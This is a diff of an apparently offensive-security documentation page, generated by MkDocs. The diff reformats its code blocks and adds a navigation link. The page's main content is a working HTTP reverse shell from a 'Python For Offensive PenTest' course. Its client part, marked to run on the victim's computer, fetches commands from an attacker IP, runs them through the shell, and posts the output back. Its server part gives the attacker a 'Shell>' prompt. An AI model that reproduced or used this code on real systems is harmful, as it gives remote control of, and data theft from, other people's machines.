@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17065,67 +17088,122 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </details>
 <h2 id="client-side">Client side</h2>
 <p>To be run on victim's computer.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved </span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>import<span class="w"> </span>requests
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>import<span class="w"> </span>subprocess
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>import<span class="w"> </span><span class="nb">time</span>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="k">while</span><span class="w"> </span>True:
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="nv">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span><span class="s1">&#39;http://192.168.0.152:8080&#39;</span><span class="o">)</span><span class="w"> </span><span class="c1"># Send GET request to our kali server</span>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="nb">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>req.text<span class="w"> </span><span class="c1"># Store the received txt into command variable</span>
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;terminate&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span>command:
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">        </span><span class="k">break</span>
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">    </span><span class="k">else</span>:
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">        </span><span class="nv">CMD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>subprocess.Popen<span class="o">(</span>command,<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>True,stdin<span class="o">=</span>subprocess.PIPE,<span class="w"> </span><span class="nv">stdout</span><span class="o">=</span>subprocess.PIPE,<span class="w"> </span><span class="nv">stderr</span><span class="o">=</span>subprocess.PIPE<span class="o">)</span>
-</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">        </span><span class="nv">post_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.post<span class="o">(</span><span class="nv">url</span><span class="o">=</span><span class="s1">&#39;http://192.168.0.152:8080&#39;</span>,<span class="w"> </span><span class="nv">data</span><span class="o">=</span>CMD.stdout.read<span class="o">())</span><span class="w"> </span><span class="c1"># POST the result</span>
-</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">        </span><span class="nv">post_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.post<span class="o">(</span><span class="nv">url</span><span class="o">=</span><span class="s1">&#39;http://192.168.0.152:8080&#39;</span>,<span class="w"> </span><span class="nv">data</span><span class="o">=</span>CMD.stderr.read<span class="o">())</span><span class="w"> </span><span class="c1"># or the error -if any-</span>
-</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>
-</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w">    </span>time.sleep<span class="o">(</span><span class="m">3</span><span class="o">)</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span>
+<span class="normal"><a href="#__codelineno-0-18">18</a></span>
+<span class="normal"><a href="#__codelineno-0-19">19</a></span>
+<span class="normal"><a href="#__codelineno-0-20">20</a></span>
+<span class="normal"><a href="#__codelineno-0-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved </span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>import<span class="w"> </span>requests
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>import<span class="w"> </span>subprocess
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>import<span class="w"> </span><span class="nb">time</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="k">while</span><span class="w"> </span>True:
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="w">    </span><span class="nv">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span><span class="s1">&#39;http://192.168.0.152:8080&#39;</span><span class="o">)</span><span class="w"> </span><span class="c1"># Send GET request to our kali server</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="w">    </span><span class="nb">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>req.text<span class="w"> </span><span class="c1"># Store the received txt into command variable</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;terminate&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span>command:
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="w">        </span><span class="k">break</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="w">    </span><span class="k">else</span>:
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="w">        </span><span class="nv">CMD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>subprocess.Popen<span class="o">(</span>command,<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>True,stdin<span class="o">=</span>subprocess.PIPE,<span class="w"> </span><span class="nv">stdout</span><span class="o">=</span>subprocess.PIPE,<span class="w"> </span><span class="nv">stderr</span><span class="o">=</span>subprocess.PIPE<span class="o">)</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18"></a><span class="w">        </span><span class="nv">post_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.post<span class="o">(</span><span class="nv">url</span><span class="o">=</span><span class="s1">&#39;http://192.168.0.152:8080&#39;</span>,<span class="w"> </span><span class="nv">data</span><span class="o">=</span>CMD.stdout.read<span class="o">())</span><span class="w"> </span><span class="c1"># POST the result</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a><span class="w">        </span><span class="nv">post_response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.post<span class="o">(</span><span class="nv">url</span><span class="o">=</span><span class="s1">&#39;http://192.168.0.152:8080&#39;</span>,<span class="w"> </span><span class="nv">data</span><span class="o">=</span>CMD.stderr.read<span class="o">())</span><span class="w"> </span><span class="c1"># or the error -if any-</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20"></a>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21"></a><span class="w">    </span>time.sleep<span class="o">(</span><span class="m">3</span><span class="o">)</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="server-side">Server side</h2>
 <p>To be run on attacker's computer.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved </span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>import<span class="w"> </span>http.server
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="nv">HOST_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;192.168.0.152&quot;</span><span class="w"> </span>//<span class="w"> </span>our<span class="w"> </span>attacker<span class="w"> </span>machine
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="nv">PORT_NUMBER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">8080</span><span class="w"> </span>//<span class="w"> </span>attacker<span class="w"> </span>listening<span class="w"> </span>port
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>class<span class="w"> </span>MyHandler<span class="o">(</span>http.server.BaseHTTPRequestHandler<span class="o">)</span>:<span class="w"> </span><span class="c1"># MyHandler defines what we should do when we receive a GET/POST</span>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">    </span>def<span class="w"> </span>do_GET<span class="o">(</span>self<span class="o">)</span>:
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">        </span><span class="nb">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>input<span class="o">(</span><span class="s2">&quot;Shell&gt; &quot;</span><span class="o">)</span>
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">        </span>self.send_response<span class="o">(</span><span class="m">200</span><span class="o">)</span>
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w">        </span>self.send_header<span class="o">(</span><span class="s2">&quot;Content-type&quot;</span>,<span class="w"> </span><span class="s2">&quot;text/html&quot;</span><span class="o">)</span>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w">        </span>self.end_headers<span class="o">()</span>
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="w">        </span>self.wfile.write<span class="o">(</span>command.encode<span class="o">())</span>
-</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
-</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="w">    </span>def<span class="w"> </span>do_POST<span class="o">(</span>self<span class="o">)</span>:
-</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
-</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w">        </span>self.send_response<span class="o">(</span><span class="m">200</span><span class="o">)</span>
-</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">        </span>self.end_headers<span class="o">()</span>
-</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="w">        </span><span class="nv">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>int<span class="o">(</span>self.headers<span class="o">[</span><span class="s1">&#39;Content-length&#39;</span><span class="o">])</span><span class="w"> </span><span class="c1">#Define the length which means how many bytes the HTTP POST data contains, the length value has to be integer</span>
-</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="w">        </span><span class="nv">postVar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>self.rfile.read<span class="o">(</span>length<span class="o">)</span>
-</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="w">        </span>print<span class="o">(</span>postVar.decode<span class="o">())</span>
-</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>
-</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="k">if</span><span class="w"> </span><span class="nv">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;__main__&quot;</span>:
-</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>
-</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="w">    </span><span class="c1"># We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)</span>
-</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="w">    </span><span class="nv">server_class</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>http.server.HTTPServer
-</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="w">    </span><span class="nv">httpd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>server_class<span class="o">((</span>HOST_NAME,<span class="w"> </span>PORT_NUMBER<span class="o">)</span>,<span class="w"> </span>MyHandler<span class="o">)</span>
-</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="w">    </span>try:
-</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="w">        </span>httpd.serve_forever<span class="o">()</span><span class="w"> </span><span class="c1"># start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server</span>
-</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="w">    </span>except<span class="w"> </span>KeyboardInterrupt:
-</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="w">        </span>print<span class="o">(</span><span class="s1">&#39;[!] Server is terminated&#39;</span><span class="o">)</span>
-</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="w">        </span>httpd.server_close<span class="o">()</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span>
+<span class="normal"><a href="#__codelineno-1-13">13</a></span>
+<span class="normal"><a href="#__codelineno-1-14">14</a></span>
+<span class="normal"><a href="#__codelineno-1-15">15</a></span>
+<span class="normal"><a href="#__codelineno-1-16">16</a></span>
+<span class="normal"><a href="#__codelineno-1-17">17</a></span>
+<span class="normal"><a href="#__codelineno-1-18">18</a></span>
+<span class="normal"><a href="#__codelineno-1-19">19</a></span>
+<span class="normal"><a href="#__codelineno-1-20">20</a></span>
+<span class="normal"><a href="#__codelineno-1-21">21</a></span>
+<span class="normal"><a href="#__codelineno-1-22">22</a></span>
+<span class="normal"><a href="#__codelineno-1-23">23</a></span>
+<span class="normal"><a href="#__codelineno-1-24">24</a></span>
+<span class="normal"><a href="#__codelineno-1-25">25</a></span>
+<span class="normal"><a href="#__codelineno-1-26">26</a></span>
+<span class="normal"><a href="#__codelineno-1-27">27</a></span>
+<span class="normal"><a href="#__codelineno-1-28">28</a></span>
+<span class="normal"><a href="#__codelineno-1-29">29</a></span>
+<span class="normal"><a href="#__codelineno-1-30">30</a></span>
+<span class="normal"><a href="#__codelineno-1-31">31</a></span>
+<span class="normal"><a href="#__codelineno-1-32">32</a></span>
+<span class="normal"><a href="#__codelineno-1-33">33</a></span>
+<span class="normal"><a href="#__codelineno-1-34">34</a></span>
+<span class="normal"><a href="#__codelineno-1-35">35</a></span>
+<span class="normal"><a href="#__codelineno-1-36">36</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved </span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>import<span class="w"> </span>http.server
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="nv">HOST_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;192.168.0.152&quot;</span><span class="w"> </span>//<span class="w"> </span>our<span class="w"> </span>attacker<span class="w"> </span>machine
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="nv">PORT_NUMBER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">8080</span><span class="w"> </span>//<span class="w"> </span>attacker<span class="w"> </span>listening<span class="w"> </span>port
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>class<span class="w"> </span>MyHandler<span class="o">(</span>http.server.BaseHTTPRequestHandler<span class="o">)</span>:<span class="w"> </span><span class="c1"># MyHandler defines what we should do when we receive a GET/POST</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a><span class="w">    </span>def<span class="w"> </span>do_GET<span class="o">(</span>self<span class="o">)</span>:
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a><span class="w">        </span><span class="nb">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>input<span class="o">(</span><span class="s2">&quot;Shell&gt; &quot;</span><span class="o">)</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a><span class="w">        </span>self.send_response<span class="o">(</span><span class="m">200</span><span class="o">)</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a><span class="w">        </span>self.send_header<span class="o">(</span><span class="s2">&quot;Content-type&quot;</span>,<span class="w"> </span><span class="s2">&quot;text/html&quot;</span><span class="o">)</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a><span class="w">        </span>self.end_headers<span class="o">()</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a><span class="w">        </span>self.wfile.write<span class="o">(</span>command.encode<span class="o">())</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="w">    </span>def<span class="w"> </span>do_POST<span class="o">(</span>self<span class="o">)</span>:
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a><span class="w">        </span>self.send_response<span class="o">(</span><span class="m">200</span><span class="o">)</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a><span class="w">        </span>self.end_headers<span class="o">()</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a><span class="w">        </span><span class="nv">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>int<span class="o">(</span>self.headers<span class="o">[</span><span class="s1">&#39;Content-length&#39;</span><span class="o">])</span><span class="w"> </span><span class="c1">#Define the length which means how many bytes the HTTP POST data contains, the length value has to be integer</span>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24"></a><span class="w">        </span><span class="nv">postVar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>self.rfile.read<span class="o">(</span>length<span class="o">)</span>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25"></a><span class="w">        </span>print<span class="o">(</span>postVar.decode<span class="o">())</span>
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26"></a>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27"></a><span class="k">if</span><span class="w"> </span><span class="nv">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;__main__&quot;</span>:
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28"></a>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29"></a><span class="w">    </span><span class="c1"># We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)</span>
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30"></a><span class="w">    </span><span class="nv">server_class</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>http.server.HTTPServer
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31"></a><span class="w">    </span><span class="nv">httpd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>server_class<span class="o">((</span>HOST_NAME,<span class="w"> </span>PORT_NUMBER<span class="o">)</span>,<span class="w"> </span>MyHandler<span class="o">)</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32"></a><span class="w">    </span>try:
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33"></a><span class="w">        </span>httpd.serve_forever<span class="o">()</span><span class="w"> </span><span class="c1"># start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server</span>
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34"></a><span class="w">    </span>except<span class="w"> </span>KeyboardInterrupt:
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35"></a><span class="w">        </span>print<span class="o">(</span><span class="s1">&#39;[!] Server is terminated&#39;</span><span class="o">)</span>
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36"></a><span class="w">        </span>httpd.server_close<span class="o">()</span>
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17201,7 +17279,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
